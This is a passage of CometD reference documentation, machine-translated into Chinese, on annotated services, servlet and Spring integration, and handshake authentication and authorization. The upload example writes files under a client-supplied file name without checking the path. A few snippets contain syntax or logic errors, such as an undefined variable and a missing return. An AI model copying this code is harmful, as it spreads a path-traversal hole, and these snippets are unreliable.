对于服务器端服务，使用@Subscription注释的方法表示在消息的本地处理期间调用的回调函数。 本地处理相当于远程客户端处理，但是它在服务器本地。 语义与远程客户端处理非常相似，因为该消息已完成服务器端处理并已发布。 当它到达本地时，发布者的信息不再可用，并且该消息是简单的org.cometd.bayeux.Message而不是org.cometd.bayeux.server.ServerMessage，正如它发生的那样 远程客户端。

这是一个比较罕见的用例（大部分时间用户代码必须用@Listener语义触发），但仍然可用。

回调方法签名必须是：


- 服务器正在处理的消息。


- 零个或多个String参数对应于通道参数。

	@Service("echoService")
	public class EchoService {
   		@Inject
    	private BayeuxServer bayeux;
    	@Session
    	private ServerSession serverSession;

    	@org.cometd.annotation.Subscription("/echo")
    	public void echo(Message message) {
        	System.out.println("Echo service published " + message);
    	}
	}

由@Subscription注释指定的频道可能与模板频道类似于已经在监听器部分中记录的频道。

####9.3.3.10. 带有二进制数据的服务器端注释服务

接收二进制数据的服务与其他注释服务类似。

请记住，您必须按照二进制扩展部分中的说明启用二进制扩展。

唯一的区别是消息的数据字段是org.cometd.bayeux.BinaryData类型的对象。

例如：

@Service("uploadService")
public class UploadService {
    @Inject
    private BayeuxServer bayeux;
    @Session
    private ServerSession serverSession;

    @Listener("/binary")
    public void upload(ServerSession remote, ServerMessage message) throws IOException {
        BinaryData binary = (BinaryData)message.getData();

        Map<String, Object> meta = binary.getMetaData();
        String fileName = (String)meta.get("fileName");
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), fileName);

        ByteBuffer buffer = binary.asByteBuffer();

        try (ByteChannel channel = Files.newByteChannel(path, StandardOpenOption.APPEND)) {
            channel.write(buffer);
        }

        if (binary.isLast()) {
            // Do something with the whole file.
        }
    }
}

####9.3.3.11。 远程呼叫配置支持

仅对于服务器端服务，使用@RemoteCall注释的方法表示客户端远程调用的目标。

远程调用对于希望执行可能不涉及消息传递的服务器端操作的客户特别有用（尽管他们可以）。 典型的例子是从/向数据库检索/存储数据，更新某个服务器状态或触发对外部系统的呼叫。

由客户端执行的远程呼叫被转换为在服务信道上发布的消息。 CometD实现负责将请求与响应关联起来，并负责处理故障情况。 应用程序暴露于更简单的API，但底层机制是发送者在服务通道（请求）上发布Bayeux消息，并将响应Bayeux消息发送回发件人。

	@Service
	public class RemoteCallService {
    	@RemoteCall("contacts")
    	public void retrieveContacts(final RemoteCall.Caller caller, final Object data) {
        	// Perform a lengthy query to the database to
        	// retrieve the contacts in a separate thread.
        	new Thread(new Runnable() {
            	@Override
            	public void run() {
                	try {
                    	Map<String, Object> arguments = (Map<String, Object>)data;
                    	String userId = (String)arguments.get("userId");
                    	List<String> contacts = retrieveContactsFromDatabase(userId);

                    	// We got the contacts, respond.
                    	caller.result(contacts);
                	} catch (Exception x) {
                    	// Uh-oh, something went wrong.
                    	caller.failure(x.getMessage());
                	}
            	}
        	}).start();
    	}
	}

在上面的示例中，@RemoteCall注释指定为目标/联系人。目标字符串用于构建服务通道，可能或可能不以/字符开头，甚至可能由多个部分组成，如contacts / active。由@RemoteCall注释指定的目标字符串可能具有诸如contacts / {userId}之类的参数，并且使用@RemoteCall注解的方法的签名必须使用与@Listener方法相同的规则进行更改。

retrieveContacts方法有两个参数：



- 代表发起呼叫的远程客户端的RemoteCall.Caller对象



- 一个Object对象，表示远程客户端发送的数据。

调用者对象包装代表远程客户端的ServerSession，而数据对象代表Bayeux消息数据字段。

第二个参数的类型可以是反序列化为Bayeux消息的数据字段的任何类，甚至是自定义应用程序类。有关自定义反序列化的更多信息，请参阅JSON部分。

应用程序可以根据需要实现retrieveContacts方法，只要它通过调用RemoteCall.Caller.result（）或RemoteCall.Caller.failure（）来答复客户端。如果这些方法中的任何一个都没有被调用，那么客户端默认会在客户端超时。

如果使用@RemoteCall注解的方法抛出未捕获的异常，则CometD实现将代表应用程序执行对RemoteCall.Caller.failure（）的调用。建议应用程序将用@RemoteCall注解的方法的代码用try / catch块封装，如上例所示。

####9.3.3.12. 注释处理

org.cometd.annotation.ServerAnnotationProcessor类执行注释处理。

	BayeuxServer bayeux = ...;

	// Create the ServerAnnotationProcessor
	ServerAnnotationProcessor processor = new ServerAnnotationProcessor(bayeux);

	// Create the service instance
	EchoService service = new EchoService();

	// Process the annotated service
	processor.process(service);


ServerAnnotationProcessor.process（）方法返回后，通过注入BayeuxServer对象和会话对象，通过调用初始化生命周期方法以及注册侦听器和订户来处理服务。

对称地，ServerAnnotationProcessor.deprocess（）执行注解解析，注销解析监听器和订户，然后调用销毁生命周期方法（但不会取消注册BayeuxServer对象或会话对象）。

####9.3.3.13.客户端注释服务

像他们的服务器端对应的一样，客户端服务包含用@Service注释的类。

CometD引入了客户端服务来减少所需的样板代码：

**注释样式**

	@Service
	public class Service {
    	@Session
    	private ClientSession bayeuxClient;

    	@Listener(Channel.META_CONNECT)
    	public void metaConnect(Message connect) {
        	// Connect handling...
    	}

    	@Subscription("/foo")
    	public void foo(Message message) {
        	// Message handling...
    	}
	}

**传统样式**

	ClientSession bayeuxClient = ...;

	bayeuxClient.getChannel(Channel.META_CONNECT).addListener(new ClientSessionChannel.MessageListener() {
    	public void onMessage(ClientSessionChannel channel, Message message) {
        	// Connect handling...
    	}
	});

	bayeuxClient.handshake();
	bayeuxClient.waitFor(1000, BayeuxClient.State.CONNECTED);

	bayeuxClient.getChannel("/foo").subscribe(new ClientSessionChannel.MessageListener() {
    	public void onMessage(ClientSessionChannel channel, Message message) {
        	// Message handling...
    	}
	});


####9.3.3.14. 依赖注入和生命周期管理支持

CometD项目不为客户端服务提供依赖注入，但通过标准JSR 250 @PostConstruct和@PreDestroy注释支持生命周期管理。 客户端服务通常比服务器端服务具有更短的生命周期，并且通常在创建客户端服务实例时直接注入它们的依赖关系。

####9.3.3.15. 会话配置支持

在客户端注释服务中，@Session注释允许服务实例将ClientSession对象注入字段或方法。 与服务器端注释服务一样，会话字段（或方法）也不能使用@Inject注入。 这是为了允许服务实例和ClientSession实例之间的最大配置灵活性。

	@Service
	public class Service {
    	@org.cometd.annotation.Session
    	private ClientSession bayeuxClient;
	}


####9.3.3.16. 监听器配置支持

在客户端注释服务中，使用@Listener注释的方法表示在收到元信道上的消息时调用的回调函数。 不要使用侦听器回调来订阅广播频道。

**注释样式**
	
	@Service
	public class Service {
    	@Listener(Channel.META_CONNECT)
    	public void metaConnect(Message connect) {
        	// Connect handling...
    	}	
	}

**传统样式**

	bayeuxClient.getChannel(Channel.META_CONNECT).addListener(new ClientSessionChannel.MessageListener() {
    	public void onMessage(ClientSessionChannel channel, Message message) {
        	// Connect handling...
    	}
	});

####9.3.3.17。 订阅配置支持

在客户端注释服务中，使用@Subscription注释的方法表示在广播频道接收消息时调用的回调函数。

**注释样式**

	@Service
	public class Service {
    	@Listener("/foo/*")
    	public void foos(Message message) {
       	// Message handling...
    	}
	}

**传统样式**

	bayeuxClient.getChannel("/foo/*").subscribe(new ClientSessionChannel.MessageListener() {
    	public void onMessage(ClientSessionChannel channel, Message message) {
        	// Message handling...
    	}
	});

####9.3.3.18. 注释处理

org.cometd.annotation.ClientAnnotationProcessor类执行注释处理。

	ClientSession bayeuxClient = ...;

	// Create the ClientAnnotationProcessor
	ClientAnnotationProcessor processor = new ClientAnnotationProcessor(bayeuxClient);

	// Create the service instance
	Service service = new Service();

	// Process the annotated service
	processor.process(service);

	bayeuxClient.handshake();

侦听器回调立即在ClientSession对象上配置，而订阅回调会自动延迟，直到握手成功完成。

####9.3.3.19。 服务集成

有几种方法可将您的Bayeux服务集成到您的Web应用程序中。 这很复杂，因为CometDServlet创建BayeuxServer对象，并且通常无法简单检测何时创建BayeuxServer对象。

####9.3.3.20。 通过配置Servlet集成

使用服务初始化Web应用程序的最简单方法是使用配置servlet。 此配置servlet没有URL映射，因为它的唯一范围是初始化（或连线）服务以使Web应用程序正常工作。

这是一个示例web.xml：


	<?xml version="1.0" encoding="UTF-8"?>
	<web-app xmlns="http://java.sun.com/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://java.sun.com/xml/ns/javaee 
	http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
         version="3.0">

    <servlet>
        <servlet-name>cometd</servlet-name>
        <servlet-class>org.cometd.server.CometDServlet</servlet-class>
        <load-on-startup>1</load-on-startup>
        <async-supported>true</async-supported>
    </servlet>
    <servlet-mapping>
        <servlet-name>cometd</servlet-name>
        <url-pattern>/cometd/*</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>configuration</servlet-name>
        <servlet-class>com.acme.cometd.ConfigurationServlet</servlet-class>
        <load-on-startup>2</load-on-startup>
    </servlet>

	</web-app>

请注意，web.xml文件指定<load-on-startup>为：


1. 用于CometD servlet - 以便Bayeux对象被创建并放入ServletContext中。
2. 用于配置servlet - 以便它仅在CometD servlet初始化并因此BayeuxServer对象可用后才被初始化。

这是ConfigurationServlet的代码：

	public class ConfigurationServlet extends GenericServlet {
    	public void init() throws ServletException {
        	// Grab the Bayeux object
        	BayeuxServer bayeux = (BayeuxServer)getServletContext().getAttribute(BayeuxServer.ATTRIBUTE);
        	new EchoService(bayeux);
        	// Create other services here

        	// This is also the place where you can configure the Bayeux object
        	// by adding extensions or specifying a SecurityPolicy
    	}

    	public void service(ServletRequest request, ServletResponse response) throws ServletException, IOException {
        	throw new ServletException();
    	}
	}

另请参阅有关EchoService的本节。

####9.3.3.21. 通过配置监听器进行集成

您可以通过编写实现ServletContextAttributeListener的类来使用配置监听器，而不是使用配置servlet。

这是一个示例web.xml文件：

	<?xml version="1.0" encoding="UTF-8"?>
	<web-app xmlns="http://java.sun.com/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://java.sun.com/xml/ns/javaee 
	http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
         version="3.0">

    <servlet>
        <servlet-name>cometd</servlet-name>
        <servlet-class>org.cometd.server.CometDServlet</servlet-class>
        <load-on-startup>1</load-on-startup>
        <async-supported>true</async-supported>
    </servlet>
    <servlet-mapping>
        <servlet-name>cometd</servlet-name>
        <url-pattern>/cometd/*</url-pattern>
    </servlet-mapping>

    <listener>
        <listener-class>com.acme.cometd.BayeuxInitializer</listener-class>
    </listener>

	</web-app>

这是BayeuxInitializer的代码：

	public class BayeuxInitializer implements ServletContextAttributeListener {
    	public void attributeAdded(ServletContextAttributeEvent event) {
        	if (Bayeux.ATTRIBUTE.equals(event.getName())) {
            	// Grab the Bayeux object
            	BayeuxServer bayeux = (BayeuxServer)event.getValue();
            	new EchoService(bayeux);
            	// Create other services here

            	// This is also the place where you can configure the Bayeux object
            	// by adding extensions or specifying a SecurityPolicy
        	}
    	}

    	public void attributeRemoved(ServletContextAttributeEvent event) {
    	}

    	public void attributeReplaced(ServletContextAttributeEvent event) {
    	}
}

####9.3.3.22. 整合注释服务

如果您更喜欢使用带注释的服务（另请参阅带注释的服务部分，您仍然必须将它们集成到您的Web应用程序中。该过程与上述过程非常相似，但它需要使用注释处理器来处理您的注释 服务。

例如，ConfigurationServlet变为：

public class ConfigurationServlet extends GenericServlet {
    private final List<Object> services = new ArrayList<>();
    private ServerAnnotationProcessor processor;

    public void init() throws ServletException {
        // Grab the BayeuxServer object
        BayeuxServer bayeux = (BayeuxServer)getServletContext().getAttribute(BayeuxServer.ATTRIBUTE);

        // Create the annotation processor
        processor = new ServerAnnotationProcessor(bayeux);

        // Create your annotated service instance and process it
        Object service = new EchoService();
        processor.process(service);
        services.add(service);

        // Create other services here

        // This is also the place where you can configure the Bayeux object
        // by adding extensions or specifying a SecurityPolicy
    	}

    	public void destroy() throws ServletException {
        	// Deprocess the services that have been created
        	for (Object service : services) {
            	processor.deprocess(service);
        	}
    	}

    	public void service(ServletRequest request, ServletResponse response) throws ServletException, IOException {
        	throw new ServletException();
    	}
	}

####9.3.3.23. 通过AnnotationCometDServlet集成注释服务

org.cometd.java.annotation.AnnotationCometDServlet允许您指定一个以逗号分隔的类名列表，以使用ServerAnnotationProcessor实例化和处理。

这是一个示例web.xml：

	<?xml version="1.0" encoding="UTF-8"?>
	<web-app xmlns="http://java.sun.com/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
         version="3.0">

    <servlet>
        <servlet-name>cometd</servlet-name>
        <servlet-class>org.cometd.java.annotation.AnnotationCometDServlet</servlet-class>
        <init-param>
            <param-name>services</param-name>
            <param-value>com.acme.cometd.FooService, com.acme.cometd.BarService</param-value>
        </init-param>
        <load-on-startup>1</load-on-startup>
        <async-supported>true</async-supported>
    </servlet>
    <servlet-mapping>
        <servlet-name>cometd</servlet-name>
        <url-pattern>/cometd/*</url-pattern>
    </servlet-mapping>

	</web-app>


在此示例中，AnnotationCometDServlet实例化并处理com.acme.cometd.FooService类的一个对象以及com.acme.cometd.BarService类的一个对象的注释。

服务对象以自己的类名称存储为ServletContext属性，以便其他组件可以轻松地检索它们。 例如，可以使用以下代码检索FooService：

	public class AnotherServlet extends HttpServlet {
    	protected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        	FooService service = (FooService)getServletContext().getAttribute("com.acme.cometd.FooService");
        	// Use the foo service here
    	}
	}

当AnnotationCometDServlet被销毁时，创建的服务将被解密。

####9.3.3.24。 服务与Spring的集成

CometD服务与Spring的集成特别有趣，因为大部分时间你的Bayeux服务需要其他bean来执行他们的服务。 并非所有的Bayeux服务都像EchoService一样简单（另请参见继承的服务部分，并且集成了Spring的依赖注入（以及其他设施））大大简化了开发。

####9.3.3.25。 基于XML的Spring配置

BayeuxServer对象直接在Spring配置文件中进行配置和初始化，该配置文件将其注入到Servlet上下文中，CometD servlet在该上下文中进行拾取，不执行进一步的配置或初始化。

web.xml文件如下所示：

	<?xml version="1.0" encoding="UTF-8"?>
	<web-app xmlns="http://java.sun.com/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://java.sun.com/xml/ns/javaee 
	http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
         version="3.0">

    <servlet>
        <servlet-name>cometd</servlet-name>
        <servlet-class>org.cometd.server.CometDServlet</servlet-class>
        <async-supported>true</async-supported>
    </servlet>
    <servlet-mapping>
        <servlet-name>cometd</servlet-name>
        <url-pattern>/cometd/*</url-pattern>
    </servlet-mapping>

    <listener>
        <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
    </listener>

	</web-app>

>注意
>>需要注意的是，上面的web.xml不包含任何指定为<init-param>的配置。这是因为如果你使用Spring，你希望只在一个地方指定配置，就是在Spring配置文件中。

>>此外，<load-on-startup>指令不存在。由于Servlet规范没有定义Servlet和侦听器之间的启动顺序（特别是，<listener>元素不能使用<load-on-startup>元素进行排序），所以必须确保Spring <listener>在CometDServlet，否则你会冒险创建两个BayeuxServer对象（一个由CometDServlet创建，另一个由Spring创建），并且你的应用程序将无法正常工作（很可能，与远程客户端的连接将由CometDServlet的BayeuxServer处理，而你的服务将会受到Spring的BayeuxServer的约束）。

>>通过在CometDServlet定义中未指定<load-on-startup>元素，CometDServlet将在Spring <listener>之后被懒惰地初始化，确保只有Spring的BayeuxServer被创建并且在CometDServlet被接收来自远程客户的首次请求。

Spring的applicationContext.xml如下所示：

	<?xml version="1.0" encoding="UTF-8"?>
	<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans 
	http://www.springframework.org/schema/beans/spring-beans-4.0.xsd">

    	<bean id="otherService" class="com.acme..." />

    	<bean id="bayeux" class="org.cometd.server.BayeuxServerImpl" init-method="start" destroy-method="stop">
        	<property name="options">
            	<map>
                	<entry key="timeout" value="15000" />
            	</map>
        	</property>
    	</bean>

    	<bean id="echoService" class="com.acme.cometd.EchoService">
        	<constructor-arg><ref bean="bayeux" /></constructor-arg>
        	<constructor-arg><ref bean="otherService" /></constructor-arg>
    	</bean>

    	<bean class="org.springframework.web.context.support.ServletContextAttributeExporter">
        	<property name="attributes">
            	<map>
                	<entry key="org.cometd.bayeux" value-ref="bayeux" />
            	</map>
        	</property>
    	</bean>
	</beans>

>注意
>>在配置BayeuxServer传输时，您需要明确指定所需的所有传输，包括使用CometDServlet配置BayeuxServer时不需要指定的默认传输。 传输顺序很重要，并且您希望WebSocketTransport成为列表中的第一个，然后至少将JSONTransport（也称为“长轮询”传输）作为后备。

####9.3.3.26. 基于注释的Spring配置

Spring 3或更高版本支持基于注释的配置，并且注释的服务部分与Spring，版本3或更高版本很好地集成。 需要Spring 3或更高版本是因为它支持通过JSR 330进行注入。Spring使用CometD注释服务工作的先决条件是将JSR 330的javax.inject类与JSR 250的javax.annotation类一起使用（这些类包含在JDK 6中 因此只有在您使用JDK 5时才需要）。

>注意
>>不要忘记Spring 3或更高版本也需要类路径中的CGLIB类。

	<?xml version="1.0" encoding="UTF-8"?>
	<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:context="http://www.springframework.org/schema/context"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans 
	http://www.springframework.org/schema/beans/spring-beans-4.0.xsd
                           http://www.springframework.org/schema/context 
	http://www.springframework.org/schema/context/spring-context-4.0.xsd">

    <context:component-scan base-package="com.acme..." />

	</beans>

Spring会在给定的基础包中扫描classpath，以获得Spring bean的资格。

CometD注释的服务需要一些额外的注释才能使其符合Spring bean的要求：

	@javax.inject.Named // Tells Spring that this is a bean
	@javax.inject.Singleton // Tells Spring that this is a singleton
	@Service("echoService")
	public class EchoService {
    	@Inject
    	private BayeuxServer bayeux;
    	@Session
    	private ServerSession serverSession;

    	@PostConstruct
    	public void init() {
        	System.out.println("Echo Service Initialized");
    	}

    	@Listener("/echo")
    	public void echo(ServerSession remote, ServerMessage.Mutable message) {
        	String channel = message.getChannel();
        	Object data = message.getData();
        	remote.deliver(serverSession, channel, data);
    	}
	}

缺失的部分是你需要告诉Spring执行CometD注释的处理; 使用Spring组件来做到这一点：

	@Configuration
	public class Configurer implements DestructionAwareBeanPostProcessor, ServletContextAware {
	    private BayeuxServer bayeuxServer;
	    private ServerAnnotationProcessor processor;

	    @Inject
	    private void setBayeuxServer(BayeuxServer bayeuxServer) {
	        this.bayeuxServer = bayeuxServer;
	    }
	
	    @PostConstruct
	    private void init() {
	        this.processor = new ServerAnnotationProcessor(bayeuxServer);
	    }
	
	    @Override
	    public Object postProcessBeforeInitialization(Object bean, String name) throws BeansException {
	        processor.processDependencies(bean);
	        processor.processConfigurations(bean);
	        processor.processCallbacks(bean);
	        return bean;
	    }
	
	    @Override
	    public Object postProcessAfterInitialization(Object bean, String name) throws BeansException {
	        return bean;
	    }
	
	    @Override
	    public boolean requiresDestruction(Object bean) {
	        return true;
	    }
	
	    @Override
	    public void postProcessBeforeDestruction(Object bean, String name) throws BeansException {
	        processor.deprocessCallbacks(bean);
	    }
	
	    @Bean(initMethod = "start", destroyMethod = "stop")
	    public BayeuxServer bayeuxServer() {
	        BayeuxServerImpl bean = new BayeuxServerImpl();
	        bean.setOption(BayeuxServerImpl.LOG_LEVEL, "3");
	        return bean;
	    }
	
	    @Override
	    public void setServletContext(ServletContext servletContext) {
	        servletContext.setAttribute(BayeuxServer.ATTRIBUTE, bayeuxServer);
    	}
	}

概要：



- 这个Spring组件是BayeuxServer对象的工厂，通过bayeuxServer（）方法（用Spring的@Bean注释）。



- 创建CometD的ServerAnnotationProcessor需要BayeuxServer对象，因此它@将其注入到setter方法中。



- 生命周期回调init（）创建CometD的ServerAnnotationProcessor，然后在Spring的bean后期处理阶段使用它。



- 最后，BayeuxServer对象被导出到servlet上下文中供CometD servlet使用。

###9.3.4.授权
您可以使用org.cometd.bayeux.server.SecurityPolicy对象配置BayeuxServer对象，该对象允许您控制Bayeux协议的各个步骤，例如握手，订阅和发布。 默认情况下，BayeuxServer对象具有默认的SecurityPolicy，几乎允许任何操作。

org.cometd.bayeux.server.SecurityPolicy接口在org.cometd.server.DefaultSecurityPolicy中有一个默认实现，它可以作为定制SecurityPolicy的基类（请参阅身份验证部分的示例）。

org.cometd.bayeux.server.SecurityPolicy方法是：

	boolean canHandshake(BayeuxServer server, ServerSession session, ServerMessage message);

	boolean canCreate(BayeuxServer server, ServerSession session, String channelId, ServerMessage message);

	boolean canSubscribe(BayeuxServer server, ServerSession session, ServerChannel channel, ServerMessage messsage);

	boolean canPublish(BayeuxServer server, ServerSession session, ServerChannel channel, ServerMessage messsage);

这些方法分别控制是否要授权握手，频道创建，订阅频道或发布频道。

>注意
>>ServerSession调用SecurityPolicy方法，这些方法对应于本地客户端和远程客户端（另请参阅会话部分）。

>>应用程序代码可以通过调用方法ServerSession.isLocalSession（）来确定ServerSession是否与本地客户端相对应。

>>在几乎所有情况下，本地客户端都应该被授权，因为它们是由应用程序在服务器上创建的（例如，通过服务 - 另请参见继承的服务部分），因此是受信任的客户端。

缺省实现org.cometd.server.DefaultSecurityPolicy：



- 允许任何握手。



- 允许仅从执行握手的客户端创建一个频道，并且仅在频道不是元频道时才创建。



- 允许执行握手的客户端订阅，但如果频道是元信道则不允许订阅。



- 允许从执行握手的客户端发布到不是元渠道的任何渠道。

典型的自定义SecurityPolicy可能会覆盖canHandshake（...）方法来控制认证：

	public class CustomSecurityPolicy extends DefaultSecurityPolicy {
    	public boolean canHandshake(BayeuxServer server, ServerSession session, ServerMessage message) {
        	// Always allow local clients
        	if (session.isLocalSession()) {
            	return true;
        	}

        	// Implement custom authentication logic
        	boolean authenticated = authenticate(server, session, message);

        	return authenticated;
    	}
	}

要了解如何在BayeuxServer对象上安装自定义的SecurityPolicy，请参阅验证部分中的操作方法。

关于授权的更多信息，也请关注authorizers部分。


###9.3.5.认证
认证是一项复杂的任务，可以通过多种方式实现，而且大多数时候每种方式都是特定应用程序所特有的。 这就是为什么CometD不提供开箱即用的认证解决方案，而是提供了API，应用程序可以使用它们在几个步骤中实现自己的认证机制。

在CometD中执行验证的推荐方式是在初始握手消息中传递验证凭证。

JavaScript握手API和Java Client握手API都允许应用程序传递一个附加对象，该对象将被合并到握手消息中并发送到服务器：

	cometd.configure({
    	url: 'http://localhost:8080/myapp/cometd'
	});

	// Register a listener to be notified of authentication success or failure
	cometd.addListener('/meta/handshake', function(message) {
    	var authn = message.ext && message.ext['com.myapp.authn'];
    	if (authn && authn.failed === true) {
        	// Authentication failed, tell the user
        	window.alert('Authentication failed!');
    	}
	});

	var username = 'foo';
	var password = 'bar';

	// Send the authentication information
	cometd.handshake({
    	ext: {
        	com.myapp.authn: {
            	user: username,
            	credentials: password
        	}
    	}
	});

Bayeux协议规范建议认证信息存储在握手消息的ext字段中（请参见此处），并且最好使用扩展字段的完全限定名称，例如com.myapp.authn。

在服务器上，您需要使用org.cometd.bayeux.server.SecurityPolicy实现来配置BayeuxServer对象，以拒绝提供错误凭据的客户端的握手。

服务集成部分介绍了如何执行BayeuxServer对象的初始化和配置，您也可以使用类似的代码来配置SecurityPolicy，例如下面使用配置servlet：

	public class MyAppInitializer extends GenericServlet {
    	@Override
    	public void init() throws ServletException {
        	BayeuxServer bayeux = (BayeuxServer)getServletContext().getAttribute(BayeuxServer.ATTRIBUTE);
        	MyAppAuthenticator authenticator = new MyAppAuthenticator();
        	bayeux.setSecurityPolicy(authenticator);
    	}

    	@Override
    	public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
        	throw new ServletException();
    	}
	}

您可以在下面找到上面引用的MyAppAuthenticator类的代码：

	public class MyAppAuthenticator extends DefaultSecurityPolicy implements ServerSession.RemoveListener { 
	    @Override
	    public boolean canHandshake(BayeuxServer server, ServerSession session, ServerMessage message) { 
	        if (session.isLocalSession()) { 
	            return true;
	        }
	
	        Map<String, Object> ext = message.getExt();
	        if (ext == null) {
	            return false;
	        }
	
	        Map<String, Object> authentication = (Map<String, Object>)ext.get("com.myapp.authn");
	        if (authentication == null) {
	            return false;
	        }
	
	        Object authenticationData = verify(authentication); 
	        if (authenticationData == null) {
	            return false;
	        }
	
	        // Authentication successful
	
	        // Link authentication data to the session 
	
	        // Be notified when the session disappears
	        session.addListener(this); 
	
	        return true;
	    }
	
	    public void removed(ServerSession session, boolean expired) { 
	        // Unlink authentication data from the remote client 
	    }
	}

1.使MyAppAuthenticator成为一个SecurityPolicy和一个ServerSession.RemoveListener，因为代码真的绑在一起。

2.覆盖SecurityPolicy.canHandshake（），从客户端发送的消息中提取认证信息。

3.允许握手任何服务器端本地会话（如与服务相关的会话）。

4.验证客户端发送的验证信息，并获取稍后可以与远程客户端关联的服务器端验证数据。

5.将服务器端认证数据链接到会话。

6.注册一个监听器，当远程会话消失时通知您（步骤8中您将做出反应）。

7.实现RemoveListener.removed（），在远程会话消失时调用，或者因为它断开连接或因为崩溃。

8.取消远程客户端对象的服务器端身份验证数据链接，操作与步骤5相反。

最重要的步骤是数字5和数字8，其中服务器端身份验证数据与org.cometd.bayeux.server.ServerSession对象链接/取消链接。

这个链接很大程度上取决于应用程序。 它可以将数据库主键（代表用户帐户的行）与远程会话ID（通过session.getId（）获得）和/或反之亦然连接起来，或者可以将OAUTH令牌与远程会话ID链接起来等。

链接应该由其他对象执行，然后可以由应用程序的其他代码使用，例如：

	public class MyAppAuthenticator extends DefaultSecurityPolicy implements ServerSession.RemoveListener {
	    private final Users users;
	
	    public MyAppAuthenticator(Users users) {
	        this.users = users;
	    }
	
	    @Override
	    public boolean canHandshake(BayeuxServer server, ServerSession session, ServerMessage message) {
	        if (session.isLocalSession()) {
	            return true;
	        }
	
	        Map<String, Object> ext = message.getExt();
	        if (ext == null) {
	            return false;
	        }
	
	        Map<String, Object> authentication = (Map<String, Object>)ext.get("com.myapp.authn");
	        if (authentication == null) {
	            return false;
	        }
	
	        if (!verify(authentication)) {
	            return false;
	        }
	
	        // Authentication successful.
	
	        // Link authentication data to the session.
	        users.put(session, authentication);
	
	        // Be notified when the session disappears.
	        session.addListener(this);
	
	        return true;
	    }
	
	    public void removed(ServerSession session, boolean expired) {
	        // Unlink authentication data from the remote client
	        users.remove(session);
	    }
	}

在下面你可以找到Users类的一个非常简单的实现：

	public class Users {
	    private final ConcurrentMap<String, ServerSession> users = new ConcurrentHashMap<>();
	
	    public void put(ServerSession session, Map<String, Object> credentials) {
	        String user = (String)credentials.get("user");
	        users.put(user, session);
	    }
	
	    public void remove(ServerSession session) {
	        users.values().remove(session);
	    }
	}

Users对象现在可以注入到CometD服务中，并且它的API丰富，以适应应用程序的需求，例如检索给定会话的用户名，或给定用户名的ServerSession等。

或者，链接/取消链接（上面的步骤5和8）可以在BayeuxServer.SessionListener中执行。 这些监听器在SecurityPolicy.canHandshake（）之后被调用，并且在ServerSession被移除时也被调用，因此不需要像上面的步骤6中那样向ServerSession注册RemoveListener：

	BayeuxServer bayeuxServer = ...;
	
	final Users users = ...;
	
	bayeuxServer.addListener(new BayeuxServer.SessionListener() {
	    public void sessionAdded(ServerSession session, ServerMessage message) {
	        Map<String, Object> authentication = (Map<String, Object>)ext.get("com.myapp.authn");
	        users.put(session, authentication);
	    }
	
	    public void sessionRemoved(ServerSession session, boolean timedout) {
	        users.remove(session);
	    }
	});

每个Bayeux消息总是带有会话ID，可以认为它与HTTP会话ID类似。 同样，将服务器端认证数据放入HttpSession对象（由HTTP会话ID标识）的普遍做法，在CometD Web应用程序中，您可以将服务器端认证数据放入ServerSession对象中。

Bayeux会话ID是很长的随机生成的数字，与HTTP会话ID完全相同，并提供HTTP会话ID提供的相同级别的安全性。 如果攻击者设法嗅探Bayeux会话标识，它可以模仿该Bayeux会话，就像它可以嗅探HTTP会话标识并模拟该HTTP会话一样。 当然，用于保护HTTP应用程序的这个问题的相同解决方案可以用于保护CometD Web应用程序，特别是使用TLS。

####9.3.5.1. 自定义握手响应消息

可以定制握手响应消息，例如将对象添加到响应的ext字段，指定进一步的挑战数据或失败的代码/原因，以及客户端应该执行什么操作（例如断开连接或 重试握手）。

这是一个如何在SecurityPolicy实现中定制握手响应消息的示例：

	public class MySecurityPolicy extends DefaultSecurityPolicy {
	    public boolean canHandshake(BayeuxServer server, ServerSession session, ServerMessage message) {
	        if (!canAuthenticate(session, message)) {
	            // Retrieve the handshake response
	            ServerMessage.Mutable handshakeReply = message.getAssociated();
	
	            // Modify the advice, in this case tell to try again
	            // If the advice is not modified it will default to disconnect the client
	            Map advice = handshakeReply.getAdvice(true);
	            advice.put(Message.RECONNECT_FIELD, Message.RECONNECT_HANDSHAKE_VALUE);
	
	            // Modify the ext field with extra information on the authentication failure
	            Map ext = handshakeReply.getExt(true);
	            Map authentication = new HashMap();
	            ext.put("com.myapp.authn", authentication);
	            authentication.put("failureReason", "invalid_credentials");
	            return false;
	        }
	        return true;
	    }
	}

或者，可以通过实现BayeuxServer.Extension来定制握手响应消息：

	public class HandshakeExtension implements BayeuxServer.Extension {
	    public boolean sendMeta(ServerSession to, ServerMessage.Mutable message) {
	        if (Channel.META_HANDSHAKE.equals(message.getChannel())) {
	            if (!message.isSuccessful()) {
	                Map advice = message.getAdvice(true);
	                advice.put(Message.RECONNECT_FIELD, Message.RECONNECT_HANDSHAKE_VALUE);
	
	                Map ext = message.getExt(true);
	                Map authentication = new HashMap();
	                ext.put("com.myapp.authn", authentication);
	                authentication.put("failureReason", "invalid_credentials");
	            }
	        }
	    }
	
	    // Other methods omitted
	}

###9.3.6. 服务器通道授权人
CometD为授权人提供应用程序，该功能允许对频道操作进行细粒度的授权控制。

####9.3.6.1. 了解授权人

